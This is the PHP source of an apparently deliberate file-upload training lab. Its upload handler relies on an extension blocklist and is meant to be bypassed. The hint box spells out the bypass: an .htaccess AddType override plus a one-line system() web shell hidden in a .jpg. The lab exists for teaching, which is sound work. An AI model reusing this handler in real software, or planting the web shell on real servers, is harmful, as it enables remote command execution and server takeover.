<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

$message = '';
$uploaded = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $filename = strtolower($_FILES['file']['name']);
    $ext = pathinfo($filename, PATHINFO_EXTENSION);
    

    $blocked = ['php', 'phtml', 'php3', 'php4', 'php5', 'htaccess'];
    
    if (in_array($ext, $blocked)) {
        $message = "Error: File type not allowed!";
    } else {
        $target_dir = 'uploads/';
        if (!file_exists($target_dir)) mkdir($target_dir, 0777, true);

        $target = $target_dir . $filename;
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            $message = "Uploaded: " . htmlspecialchars($filename);
            $uploaded = true;

            if (solveLab($pdo, 10)) {
                echo "<script>alert('Critical Hit! Server configuration overridden.');</script>";
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>.htaccess Bypass - File Upload Lab 6</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="css/htaccess.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="index.php" class="back-link"><i class="fas fa-arrow-left"></i>Back</a>

    <div class="lab-header">
      <div class="difficulty-badge"><i class="fas fa-fire"></i>Medium</div>
      <h1 class="lab-title">.htaccess Bypass</h1>
      <div class="lab-tags">
        <span class="tag">Apache</span>
        <span class="tag">.htaccess</span>
        <span class="tag">AddType</span>
        <span class="tag">Configuration</span>
      </div>
      <p>PHP and .htaccess are blocked. Can you override server config?</p>
    </div>

    <form method="POST" enctype="multipart/form-data">
      <div class="upload-area">
        <i class="fas fa-file-code upload-icon"></i>
        <h3>Upload File</h3>
        <p>Blocked: .php, .phtml, .php3, .php4, .php5, .htaccess</p>
        <input type="file" name="file" id="file" style="display: none;" required>
        <button type="button" class="upload-btn" onclick="document.getElementById('file').click()">Choose File</button>
        <br><br>
        <button type="submit" class="upload-btn" style="background: var(--neon-cyan); color: #000;">Upload</button>
      </div>
    </form>

    <?php if ($message): ?>
    <?php if ($uploaded): ?>
    <div class="success-msg"><i class="fas fa-check-circle"></i><?php echo $message; ?></div>
    <?php else: ?>
    <div class="error-msg"><i class="fas fa-exclamation-circle"></i><?php echo $message; ?></div>
    <?php endif; ?>
    <?php endif; ?>

    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i>Hint - Two Steps!</div>
      <p><strong>Step 1:</strong> Upload <code>.htaccess.</code> (with a trailing dot) or use Burp to rename it after
        bypass. This file should contain:<br>
        <code>AddType application/x-httpd-php .jpg</code>
      </p>

      <p><strong>Step 2:</strong> Upload a simple <code>shell.jpg</code> containing:<br>
        <code><?php echo htmlspecialchars('<?php system($_GET["cmd"]); ?>'); ?></code>
      </p>

      <p>The server will now treat <strong>any</strong> .jpg file in the <code>uploads/</code> folder as a PHP script!
      </p>
    </div>
  </div>
</body>

</html>